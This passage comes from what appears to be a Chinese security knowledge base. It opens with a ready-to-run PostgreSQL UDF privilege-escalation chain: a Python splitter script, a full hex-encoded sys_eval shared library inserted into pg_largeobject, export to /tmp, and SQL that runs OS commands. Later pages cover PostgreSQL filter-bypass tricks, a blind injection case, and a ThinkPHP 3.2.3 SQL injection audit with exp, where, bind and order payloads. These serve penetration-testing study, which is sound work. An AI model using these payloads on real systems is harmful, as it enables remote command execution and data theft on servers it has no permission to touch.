用python脚本去分割udf.so文件,2个16进制数是一个字节所以按照4096个16进制数分割： #~/usr/bin/env python 2.7 #-*- coding:utf-8 -*- import sys from random import randint number = randint(1000, 9999) if __name__ == \"__main__\": if len(sys.argv) != 2: print \"Usage:python \" + sys.argv[0] + \"inputfile\" sys.exit() fileobj = open(sys.argv[1],'rb') i = 0 t = -1 s = '' for b in fileobj.read(): i = i + 1 s += b if i % 4096 == 0: t = t + 1 print 'insert into pg_largeobject values ({number}, {block}, decode(\\'{payload}\\',\\'hex\\'));\\n'\\ .format(number=number, block=t, payload=s) s = '' fileobj.close() 分割完成后按照下文中的sql语句执行： 1.写入对象 2.创建文件 3.建立函数 4.执行命令 5.清理函数 如果不能反弹shell也可以使用sqlmap提供的UDF命令执行的函数： https://github.com/sqlmapproject/udfhack/blob/master/linux/lib_postgresqludf_sys/lib_postgresqludf_sys.c 这里我直接给出hex分片过sql语句直接写入即可创建成功（9.6版本测试有效，如果目标是更加新的版本需要对应安装postgresql-dev扩展包编译代码） SELECT lo_create(9023); insert into pg_largeobject values (9023, 0, decode('7f454c4602010100000000000000000003003e0001000000000d0000000000004000000000000000e8210000000000000000000040003800070040001a00190001000000050000000000000000000000000000000000000000000000000000004c140000000000004c1400000000000000002000000000000100000006000000f81d000000000000f81d200000000000f81d200000000000d802000000000000e00200000000000000002000000000000200000006000000181e000000000000181e200000000000181e200000000000c001000000000000c00100000000000008000000000000000400000004000000c801000000000000c801000000000000c80100000000000024000000000000002400000000000000040000000000000050e5746404000000cc11000000000000cc11000000000000cc110000000000006c000000000000006c00000000000000040000000000000051e574640600000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000052e5746404000000f81d000000000000f81d200000000000f81d200000000000080200000000000008020000000000000100000000000000040000001400000003000000474e550052705bc9352a28aa252e8edf0fbc5d4c32e634e800000000030000001a00000002000000070000008440030810890c99880c008dc84400001a0000002100000026000000325e541ea868be124245d5ec2e67541eaa5fbe12bae3927c5f4de3214aad229d32a1f45bd871581cb88df10e25681b32c60da6d4ead3ef0e6637d3ed339268fe000000000000000000000000000000000000000000000000000000000000000003000900580b0000000000000000000000000000de00000012000000000000000000000000000000000000000901000012000000000000000000000000000000000000001c00000020000000000000000000000000000000000000007601000012000000000000000000000000000000000000006f01000012000000000000000000000000000000000000003a0100001200000000000000000000000000000000000000d60000001200000000000000000000000000000000000000110100001200000000000000000000000000000000000000fb0000001200000000000000000000000000000000000000690100001200000000000000000000000000000000000000010000002000000000000000000000000000000000000000c500000010000000000000000000000000000000000000009800000012000000000000000000000000000000000000006301000012000000000000000000000000000000000000000101000012000000000000000000000000000000000000003f0100001200000000000000000000000000000000000000f500000012000000000000000000000000000000000000005d0100001200000000000000000000000000000000000000320100001200000000000000000000000000000000000000610000002000000000000000000000000000000000000000380000002000000000000000000000000000000000000000520000002200000000000000000000000000000000000000dd00000010000000000000000000000000000000000000002d0100001200000000000000000000000000000000000000e300000012000b00d20e0000000000000800000000000000bc00000012000b00850e0000000000004d000000000000008601000010001600d0202000000000000000000000000000b300000012000b007d0e0000000000000800000000000000ec00000012000b00da0e000000000000c3000000000000009901000010001700d82020000000000000000000000000005001000012000b003b1000000000000031010000000000001801000012000b009d0f00000000000008000000000000008300000012000b00ed0d00000000000030000000000000008d01000010001700d02020000000000000000000000000001000000012000900580b00000000000000000000000000002101000012000b00a50f0000000000008e000000000000007500000012000b00e50d00000000000008000000000000001600000012000c006c1100000000000000000000000000004701000012000b00331000000000000008000000000000009f00000012000b001d0e0000000000006000000000000000005f5f676d6f6e5f73746172745f5f005f696e6974005f66696e69005f49544d5f64657265676973746572544d436c6f6e655461626c65005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c61737365730050675f6d616769635f66756e6300746578745f7074725f746f5f636861725f707472006d616c6c6f63006368725f7074725f746f5f746578745f7074720070675f66696e666f5f7379735f657865630070675f6465746f6173745f646174756d0073797374656d0070667265650070675f66696e666f5f7379735f6576616c00706f70656e006667657473007265616c6c6f63007374726e6370790070636c6f73650070675f66696e666f5f7379735f62696e6576616c00666f726b00737973636f6e66006d6d617000776169747069640070675f66696e666f5f7379735f66696c657265616400666f70656e00667365656b006674656c6c0066636c6f7365006672656164006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e3500000000000200', 'hex')); insert into pg_largeobject values (9023, 1, decode('0200000002000200020002000200020002000000000002000200020002000200020002000000000002000000020001000100010001000100010001000100010001000100010001000100010001000000010001007c0100001000000000000000751a6909000002009e01000000000000f81d2000000000000800000000000000b00d000000000000001e2000000000000800000000000000700d000000000000101e2000000000000800000000000000101e200000000000d81f20000000000006000000040000000000000000000000e01f200000000000060000000c0000000000000000000000e81f20000000000006000000150000000000000000000000f01f20000000000006000000160000000000000000000000f81f200000000000060000001700000000000000000000001820200000000000070000000200000000000000000000002020200000000000070000000300000000000000000000002820200000000000070000000500000000000000000000003020200000000000070000000600000000000000000000003820200000000000070000000700000000000000000000004020200000000000070000000800000000000000000000004820200000000000070000000900000000000000000000005020200000000000070000000a00000000000000000000005820200000000000070000002200000000000000000000006020200000000000070000000b00000000000000000000006820200000000000070000000c00000000000000000000007020200000000000070000000d00000000000000000000007820200000000000070000000e00000000000000000000008020200000000000070000000f0000000000000000000000882020000000000007000000100000000000000000000000902020000000000007000000110000000000000000000000982020000000000007000000120000000000000000000000a02020000000000007000000130000000000000000000000a82020000000000007000000140000000000000000000000b02020000000000007000000170000000000000000000000b82020000000000007000000180000000000000000000000c02020000000000007000000190000000000000000000000c820200000000000070000002900000000000000000000004883ec08488b057d1420004885c07405e8c30000004883c408c30000000000000000000000000000ff3582142000ff25841420000f1f4000ff25821420006800000000e9e0ffffffff257a1420006801000000e9d0ffffffff25721420006802000000e9c0ffffffff256a1420006803000000e9b0ffffffff25621420006804000000e9a0ffffffff255a1420006805000000e990ffffffff25521420006806000000e980ffffffff254a1420006807000000e970ffffffff25421420006808000000e960ffffffff253a1420006809000000e950ffffffff2532142000680a000000e940ffffffff252a142000680b000000e930ffffffff2522142000680c000000e920ffffffff251a142000680d000000e910ffffffff2512142000680e000000e900ffffffff250a142000680f000000e9f0feffffff25021420006810000000e9e0feffffff25fa1320006811000000e9d0feffffff25f21320006812000000e9c0feffffff25ea1320006813000000e9b0feffffff25e21320006814000000e9a0feffffff25da1320006815000000e990feffffff25d21320006816000000e980feffff488d05d0132000488d3dc2132000554829f84889e54883f80e77025dc3488b05b41220004885c074f25dffe00f1f4000488d0599132000488d3d92132000554829f84889e548c1f8034889c248c1ea3f4801d048d1f875025dc3488b158f1220004885d274f25d4889c6ffe20f1f4000803d5913200000752748833d7712200000554889e5740c488d3d82102000e82dffffffe868ffffff5dc6053013200001f3c30f1f4000662e0f1f84000000000048833d50102000007426488b05271220004885c0741a55488d3d3a1020004889e5ffd05de957ffffff0f1f8000000000e94bffffff488d05c4030000c355534889fb508b17c1ea028d6afc8d7d014863ffe84afeffff4863d5488d73044889c74889d1f3a4c60410005a5b5dc341544983ccff4c89e15531ed4088e8534889fbf2ae48f7d1488d7903e812feffff4889df4889c24c89e14088e84889def2ae4889df48f7d18d048d0c0000004c89e189024088e8f2ae488d420448f7d14c01e14889c74889d0f3a45b5d415cc3488d0528030000c341554154554889fd5351488b7f20e8a8fdffff4889c74889c3e86dfdffff4989c44889c7e832fdffff4c89e74189c5e8d7fcffff483b5d2074084889dfe809feffff5a5b5d415c4489e8415dc3488d05cf020000c34157415641554154555352488b7f20e852fdffff4889c7e81afdffffbf000400004889c5e84dfdffffbf010000004989c4e840fdffff488d35690200004889efc600004889c331ede869fdffff4989c54c89eabe080000004c89e7e8c6fcffff4885c0743931c04c89e74883c9fff2ae4889df48f7d14c8d71ff468d7c35004963f7e80ffdffff488d3c284963d64c89e64889c34963efe82afcffffebb24c89efe870fcffff803b007405c6442bff00584889df5b5d415c415d415e415fe953fdffff488d0500020000c341545553488b7f20e88efcffff4989c48b28e824fdffff85c07907b801000000eb677555c1ed02bf1e000000e8dafcffff83ed04488d70ff4531c94863ed4531c031ff488d042e48f7d6b921000000ba070000004821c6e8cffbff', 'hex')); insert into pg_largeobject values (9023, 2, decode('ff4883f8ff4889c374b6498d7424044889ea4889c7e886fbffffffd3eb0eba0100000031f689c7e854fcffff31c05b5d415cc3488d0566010000c341574989ff41564155415455534883ec28488b7f20e8ebfbffff488d7c240f488d3524010000b911000000f3a44889c7e8a0fbffff488d350b0100004889c74989c4e81efcffff4885c04889c3744431f6ba020000004889c7e8c7fbffff4889dfe87ffbffff31d231f64889c54889df4189c5e8adfbffff8d7d014863ffe892fbffff4885c04989c675144889dfe8f2faffff41c6471c0131c0e9830000004889d9ba010000004863f54889c7e8c3faffff4889dfe8cbfaffff8d7c2d014863ffe84ffbffff31d24889c34139d58d04127e23418a041688c183e00fc0e9048a44040f83e10f8a4c0c0f88445301880c5348ffc2ebd548984889dfc6040300e8b1fbffff4889df4889c5e846faffff4c89f7e83efaffff4c89e7e836faffff4889e84883c4285b5d415c415d415e415fc34883ec084883c408c300000000000000000000007200726200303132333435363738394142434445460000000000000000000000010000000100000001000000010000001c0000008a0300006400000020000000400000000100000001000000011b033b680000000c000000b4f9ffff8400000019fcffffac00000021fcffffc400000051fcffffec000000b1fcffff1c010000b9fcffff3401000006fdffff6c0100000efdffff84010000d1fdffffcc010000d9fdffffe401000067feffff140200006ffeffff2c0200001400000000000000017a5200017810011b0c070890010000240000001c00000028f9ffff80010000000e10460e184a0f0b770880003f1a3b2a33242200000000140000004400000065fbffff080000000000000000000000240000005c00000055fbffff3000000000410e108602410e188303440e20670e18410e10410e08002c000000840000005dfbffff6000000000420e108c02480e188603460e208304024c0e18410e10420e0800000000000014000000b40000008dfbffff08000000000000000000000034000000cc0000007dfbffff4d00000000420e108d02420e188c03410e208604440e288305410e30790e28410e20410e18420e10450e0800140000000401000092fbffff080000000000000000000000440000001c01000082fbffffc300000000420e108f02420e188e03420e208d04420e288c05410e308606410e388307410e4002a60e38440e30410e28420e20420e18420e10420e081400000064010000fdfbffff0800000000000000000000002c0000007c010000edfbffff8e00000000420e108c02410e188603410e20830402860e18410e10420e0800000000000014000000ac0100004bfcffff0800000000000000000000004c000000c40100003bfcffff3101000000420e108f02450e188e03420e208d04420e288c05410e308606410e388307440e600315010e38410e30410e28420e20420e18420e10420e080000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000', 'hex')); insert into pg_largeobject values (9023, 3, decode('00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b00d000000000000700d0000000000000000000000000000101e20000000000001000000000000007c010000000000000c00000000000000580b0000000000000d000000000000006c110000000000001900000000000000f81d2000000000001b0000000000000008000000000000001a00000000000000001e2000000000001c000000000000000800000000000000f5feff6f00000000f00100000000000005000000000000005006000000000000060000000000000060020000000000000a00000000000000aa010000000000000b00000000000000180000000000000003000000000000000020200000000000020000000000000028020000000000001400000000000000070000000000000017000000000000003009000000000000070000000000000070080000000000000800000000000000c00000000000000009000000000000001800000000000000feffff6f000000005008000000000000ffffff6f000000000100000000000000f0ffff6f00000000fa07000000000000f9ffff6f000000000300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000', 'hex')); insert into pg_largeobject values (9023, 4, decode('181e20000000000000000000000000000000000000000000960b000000000000a60b000000000000b60b000000000000c60b000000000000d60b000000000000e60b000000000000f60b000000000000060c000000000000160c000000000000260c000000000000360c000000000000460c000000000000560c000000000000660c000000000000760c000000000000860c000000000000960c000000000000a60c000000000000b60c000000000000c60c000000000000d60c000000000000e60c000000000000f60c0000000000004743433a2028474e552920342e382e3520323031353036323320285265642048617420342e382e352d31362900002e7368737472746162002e6e6f74652e676e752e6275696c642d6964002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e696e69745f6172726179002e66696e695f6172726179002e6a6372002e646174612e72656c2e726f002e64796e616d6963002e676f74002e676f742e706c74002e627373002e636f6d6d656e74000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b000000070000000200000000000000c801000000000000c80100000000000024000000000000000000000000000000040000000000000000000000000000001e000000f6ffff6f0200000000000000f001000000000000f0010000000000006c00000000000000030000000000000008000000000000000000000000000000280000000b000000020000000000000060020000000000006002000000000000f0030000000000000400000002000000080000000000000018000000000000003000000003000000020000000000000050060000000000005006000000000000aa0100000000000000000000000000000100000000000000000000000000000038000000ffffff6f0200000000000000fa07000000000000fa07000000000000540000000000000003000000000000000200000000000000020000000000000045000000feffff6f02000000000000005008000000000000500800000000000020000000000000000400000001000000080000000000000000000000000000005400000004000000020000000000000070080000000000007008000000000000c0000000000000000300000000000000080000000000000018000000000000005e000000040000004200000000000000300900000000000030090000000000002802000000000000030000000a0000000800000000000000180000000000000068000000010000000600000000000000580b000000000000580b0000000000001a0000000000000000000000000000000400000000000000000000000000000063000000010000000600000000000000800b000000000000800b00000000000080010000000000000000000000000000100000000000000010000000000000006e000000010000000600000000000000000d000000000000000d0000000000006c04000000000000000000000000000010000000000000000000000000000000740000000100000006000000000000006c110000000000006c1100000000000009000000000000000000000000000000040000000000000000000000000000007a000000010000000200000000000000801100000000000080110000000000004c0000000000000000000000000000001000000000000000000000000000000082000000010000000200000000000000cc11000000000000cc110000000000006c00000000000000000000000000000004000000000000000000000000000000900000000100000002000000000000003812000000000000381200000000000014020000000000000000000000000000080000000000000000000000000000009a0000000e0000000300000000000000f81d200000000000f81d0000000000000800000000000000000000000000000008000000000000000000000000000000a60000000f0000000300000000000000001e200000000000001e0000000000000800000000000000000000000000000008000000000000000000000000000000b2000000010000000300000000000000081e200000000000081e0000000000000800000000000000000000000000000008000000000000000000000000000000b7000000010000000300000000000000101e200000000000101e0000000000000800000000000000000000000000000008000000000000000000000000000000c4000000060000000300000000000000181e200000000000181e000000000000c001000000000000040000000000000008000000000000001000000000000000cd000000010000000300000000000000d81f200000000000d81f0000000000002800000000000000000000000000000008000000000000000800000000000000d200000001000000030000000000000000202000000000000020000000000000d000000000000000000000000000000008000000000000000800000000000000db000000080000000300000000000000d020200000000000d0200000000000000800000000000000000000000000000001000000000000000000000000000000e00000000100000030000000000000000000000000000000', 'hex')); insert into pg_largeobject values (9023, 5, decode('d0200000000000002d00000000000000000000000000000001000000000000000100000000000000010000000300000000000000000000000000000000000000fd20000000000000e900000000000000000000000000000001000000000000000000000000000000', 'hex')); SELECT lo_export(9023, '/tmp/testeval.so'); 执行命令： CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '/tmp/testeval.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE; select sys_eval('id'); drop function sys_eval; Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 11:25:57 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/01.SQLi/Postgresql/Postgresql注入基础.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/01.SQLi/Postgresql/常见防御手段及绕过方式.html":{"url":"知识库/01.WEB安全/01.SQLi/Postgresql/常见防御手段及绕过方式.html","title":"常见防御手段及绕过方式","keywords":"","body":" 空格被绕过 and/or 被绕过 单引号被过滤 比较符(> 等号 被过滤/拦截 注释符 被过滤/拦截 由于DBMS大部分都使用通用语言（SQL），因此基本功能和语法实际上是通用的。这意味着在DBMS上的绕过技巧可能会应用在不同的数据库中。实战中没有遇到过postgresql。有更好的绕过方式再继续添加 空格被绕过 + 注释符 and/or 被绕过 双写 大小写 内联注释 编码 unicode utf-8 url单引号被过滤 $$ select 'test' -- 等价于 select $$test$$ $quote$ -- 适用于当$$ 不能利用的情况下 select $quote$test$quote$ CHR SELECT CHR(65)||CHR(66)||CHR(67)||CHR(68)||CHR(69)||CHR(70)||CHR(71)||CHR(72); -- 等效于 SELECT 'ABCDEFGH'; 注意：您不能同时使用'、$$ 、$quote$，因此，如果您需要转义以单引号开头的字符串，则将无法使用$$(即这种语句是无效的SELECT 'test$$;) 比较符(> between a and b 等号 被过滤/拦截 like 注释符 被过滤/拦截 手动闭合 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:40:05 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/01.SQLi/Postgresql/常见防御手段及绕过方式.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/01.SQLi/SQL注入之伪静态页面布尔注入.html":{"url":"知识库/01.WEB安全/01.SQLi/SQL注入之伪静态页面布尔注入.html","title":"SQL注入之伪静态页面布尔注入","keywords":"","body":" 背景 测试详情 提出问题 测试结果 总结 背景 从QAX出来之后，当上了快乐安服仔。虽然以前实习那会儿干过安服，但是手艺不精，现在重操旧业，快乐安服，冲！ 今天在做SRC审核的时候，发现GET型参数中，注入的语句中存在xxx and 1=1.html，我当时心想这是混SRC吗？本想立即驳回这个漏洞的时候，我的好奇心驱使我把白帽子的报告看完，当我看到后面就发现确实人家白帽子盲注是将数据库名给注入出来了。当时我就傻了，立马复测。 测试详情 提出问题 在测试之前，所有的页面都是以html结尾，心想这就是个静态web资源吧，但是心想白帽子把payload都写得明明白白了，这里.html这里多半有妖怪，然后我在这里将*.html的文件后缀更改为了不常见的文件后缀，顺便看看thinkphp的banner信息 我尝试了很多不存在的文件后缀，发现解析都是200，这里就有提出一个疑问了，如果他真是静态资源文件，那么为什么访问一个服务器上不存在的资源还能正常解析？ 这里我问了我的hxd，确定存在了应该是存在我的hxd所说的内东西 测试结果 and 1=1 恒成立 and 1=2 恒false 标准的布尔盲注 总结 目前只遇到了thinkphp类的伪静态页面，在这种伪静态页面中，带有的参数是会和数据库交互，并且极有可能存在sqli，所以在测试诸如此类问题的时候，可以尝试是否解析静态资源文件来判断 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 11:32:57 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/01.SQLi/SQL注入之伪静态页面布尔注入.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/01.SQLi/ThinkPHP_3.2.3_SQLi.html":{"url":"知识库/01.WEB安全/01.SQLi/ThinkPHP_3.2.3_SQLi.html","title":"ThinkPHP_3.2.3_SQLi","keywords":"","body":" 前言 审计思路 了解结构以及路由方式 tp3.2.3 .->where(\"可控参数\")->find() EXP 表达式注入 不成功案例：常规注入 .->find/select/delete(\"可控参数\") id[where]注入 ->where(\"可控参数\")->save(\"可控参数\") bind注入 ->order(\"可控参数\")->find() 案例分析 后台AD控制器SQL注入 后台任意文件读取 后台写入文件getshhell 参考链接 前言 由于最近审漏洞很多白帽子交来的是thinkphp的sql注入，手法很简单，但是还是想以代码审计的方式去研究一下ThinkPHP的相关漏洞。在选择thinkphp框架的时候，也想了很久很久，最后还是以3.2.3为例，顺便学学代码审计相关的知识。 本次选择的CMS是 yxtcmf6.1 ，它是19年3月发布且基于thinkphp3.2.3开发的cms，这个对于php代码审计小白是比较友好的。 审计思路 这个CMS是采用MVC架构开发的，首先要了解MVC架构以及文件结构，需要知道不同的页面对应的文件位置 M(Model) : 应用程序用于处理数据逻辑的部分，通常模型对象负责在数据库中存取数据 V(View): 应用程序用于处理数据显示的部分，通常视图是依据模型创建的 C(Controller): 应用程序用于处理用户交互的部分，通常控制器负责从视图读取数据（参数），控制用户输入输出，并向模型发送数据 然后需要了解thinkphp3.2.3这个框架，大致过一遍thinkphp3.2.3完全开发手册 最后可以结合静/动态扫描工具再看看 了解结构以及路由方式 目录结构中关注Application，因为这个是各种Controller所在的目录，还有相关的配置文件，如路由配置router.php(这种文件一般在conf目录下，去找用户自定义的配置文件) 比如这个路由中，user/login/index，（前台首页） 对应的目录就是${TP}/application/User/Controller/LoginController.class.php，对应执行的操作就是index()函数 tp3.2.3 .->where(\"可控参数\")->find() 在这里我使用前台登录处做一个sql注入 => where(payload)->find() 的测试，文件路径在${TP}/application/User/Controller/LoginController.class.php 我截取登录的相关代码，如下所示 function ajaxlogin(){ $username=$_POST['account']; $password=$_POST['password']; // 实例化 User $users_model=M('Users'); // 判断输入是否是手机号 if(preg_match('/^\\d+$/', $username)){ $where['mobile']=$username; }else{ // 判断输入是否是邮件 if(strpos($username,\"@\")>0){ $where['user_email']=$username; }else{ // 否则user_login 字段为用户名 $where['user_login']=$username; } } // 数据库交互处 $result = $users_model->where($where)->find(); 在这里我调试一波，使用thinkphp中的exp表达式，payload如下 account[0]=exp&account[1]=='admin' and updatexml(1,concat(0x23,user(),0x23),1)%23&password=admin&ipForget=true 我们主要看exp表达式，查询thinkphp完全开发手册 EXP 表达式注入 那么我们的构造的exp表达则为 $where=array(\"user_login\"=> array( 0 => \"exp\", 1 => \"='admin' and updatexml(1,concat(0x23,user(),0x23),1)%23\") ); 跟进调试可以看一下，在这里我们强制进入一下where函数 经过一系列 if else最后进入到最后一个else里，这里是指将我们传入的where参数赋值给$this->options里的where，$this->options是查询表达式参数，里面包含了子语句（如where,limit等等） return 之后返回到 $users_model->where($where)继续调find()方法，单步运行，进入find 函数，此时未传入参数，当前参数$options为空，然后在$this->_parseOptions($options);方法下，将options 中的where表达式，table，以及model取到，然后进行$this->db->select($options) 在这里，我们进入select方法，在这里可以看到我们传入了table，where，model，然后准备进行拼接sql语句， 然后我们进入buildSelectSql函数，来查看到底是怎样拼接的sql语句。 进入之后，可以看到先是计算分页，然后再使用了parseSql函数，再次跟进$this->parseSql()函数，其次查看当前$this->selectSql # $this->selectSql SELECT%DISTINCT% %FIELD% FROM %TABLE%%FORCE%%JOIN%%WHERE%%GROUP%%HAVING%%ORDER%%LIMIT% %UNION%%LOCK%%COMMENT% 在parseSql这个函数中，将会替换SQL语句中的表达式 当我们到parseWhere函数中，我们主要从505行开始看，因为前面一系列判断都是判断是否传入的是字符串，以及定义操作符 从505行开始，开始遍历$where这个数组中的值，一直单步走，直到536行 在此，就开始遍历$where[$key]，开始拼接sql语句，在这里我们进入parseWhereItem($this->parseKey($key),$val)，从这里开始就是形成sql注入的关键所在了 在第570行，当判断是exp表达式的时候，这里就会拼接$wherestr + $key + $val[1]，当前$key = user_login ，$val[1] = payload，拼接起来这里的$wherestr = user_login ='admin' and updatexml(1,concat(0x23,user(),0x23),1)# 然后再返回到parseWhere()函数中，又会拼接Where字符串，连起来就是where user_login ='admin' and updatexml(1,concat(0x23,user(),0x23),1)# 再返回到parseSql()函数中，把最后的sql表达式替换完成，就会发现，exp表达式，直接将sql语句拼接起来了，我们可以看到当前的sql语句是 SELECT * FROM edu_users WHERE user_login ='admin' and updatexml(1,concat(0x23,user(),0x23),1)# LIMIT 1 就直接完成了exp表达式的sql注入 不成功案例：常规注入 如果我们不使用exp表达式，直接使用传统的sql注入方式，进行注入，可以看到，因为$val = admin' or '1'='1不是数组，直接进入else判断 在这里可以看到parseValue()，我们将$value 传入之后，直接会进入第一个条件判断中 这个escapeString函数就不多说了吧。。。单引号被转义，无法闭合，导致无法完成sql注入 .->find/select/delete(\"可控参数\") 这里find方法传参默认以pk(主键)来查询，这里我们构造一个测试页面，因为我找了一下，没有找到合适可以用于测试的controller，所以自己写一个简单 \"; $id=$I['id']; $test = M(\"test\"); $data = $test->find($id); echo $data; } } payload id[where]=1 and updatexml(1,concat(0x23,user(),0x23),1)%23 id[where]注入 调试一波，强制进入find函数 $options 是一个数组，传入为{where => \"1 and updatexml(1,concat(0x23,user(),0x23),1)%23\"}，然后直接单步走，跳过if 语句（这里等会会细讲，先注意一下） 然后到748行，开始分析表达式，进入_parseOptions（这里也强调一下，等会会讲）,一直单步下去，在648行开始，字段类型检验的时候，由于不满足条件，直接就返回$options 然后在这里，就到了回到了select，将解析后的options带入拼接sql语句 在这里我们继续看buildSelectSql()这个函数 分页逻辑不看，继续跟进parseSql里的parseWhere 这里$where是字符串，就直接赋值了，然后就返回了 那么完整的sql如下，完整闭合sql语句，报错注入完成 ->where(\"可控参数\")->save(\"可控参数\") 我在这里全局搜索，找到了在忘记密码处，满足条件，但是这里需要短信验证码辅助，以及查询是否存在该用户，我这里没有配置短信服务器，以及需要满足where，save可控这一条件，所以我单独把短信验证，以及用户名验证的这一逻辑给注释掉，如果不注释掉查询用户名这一逻辑，直接用exp表达式注入即可。 function repassword(){ $users_model=M(\"Users\"); $mobile_verify=$_POST['mobileCode']; $password=$_POST['password']; $repassword=$_POST['repassword']; $mobile=$_POST['tel']; $where['mobile']=$mobile; if(strlen($password) 20){ $result['code']='password'; $result['success']=false; $result['message']=\"密码长度至少5位，最多20位！\"; } // elseif($password !=$repassword){ // $result['code']='repassword'; // $result['success']=false; // $result['message']=\"两次密码不一致！\"; // } // elseif($mobile_verify !=$_SESSION['mobile_verify']){ // $result['code']='mobile_verify'; // $result['success']=false; // $result['message']=\"手机验证码不正确！\"; // } // elseif(!$users_model->where($where)->find()){ // $result['code']='user'; // $result['success']=false; // $result['message']=\"该手机号未注册！\"; // } else{ $data['user_pass']=sp_password($password); if($users_model->where($where)->save($data)){ $result['success']=true; unset($_SESSION['mobile_verify']); $result['message']=\"密码重置成功！\"; }else{ $result['success']=false; $result['message']=\"密码重置失败\"; } } $json_string = json_encode($result); echo $json_string; } 在这里，我们使用payload bind注入 tel[0]=bind&tel[1]=0 and (updatexml(1,concat(0x3a,(user())),1))%23&password=123456 在RegisterController.class.php中设置断点，进入$users_model->where($where)->save($data) 此时传入where的参数$where是一个array 在这里直接赋值给$this.options[where] 然后就直接返回，再调用save函数 再来看save函数，到第416行，开始分析表达式，在这里就直接原封不动地返回了$options[where] 继续向下，走到第451行开始，这里就会拼接sql 在第895行，开始拼接update 然后在第899行，开始拼接where，我们注意在第899行，在进行一系列运算之后，在满足bind的情况下，$wherestr = $key =:0 and ... 最后返回回来的sql语句就如下所示(这个是预编译的sql) 然后在execute这个函数，执行sql操作 最后在绑定参数的时候就将:0绑定成了出入的repassword语句如下所示，完成报错注入 ->order(\"可控参数\")->find() payload id=1&order[updatexml(1,concat(0x23,user(),0x23),1)] 